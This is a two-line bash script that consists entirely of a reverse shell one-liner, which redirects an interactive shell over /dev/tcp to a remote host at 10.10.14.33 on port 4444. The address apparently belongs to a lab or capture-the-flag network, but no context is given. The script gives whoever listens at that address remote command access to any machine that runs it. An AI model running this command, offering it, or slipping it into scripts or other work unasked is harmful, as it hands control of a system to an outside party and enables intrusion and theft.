#!/bin/bash

sh -i >& /dev/tcp/10.10.14.33/4444 0>&1
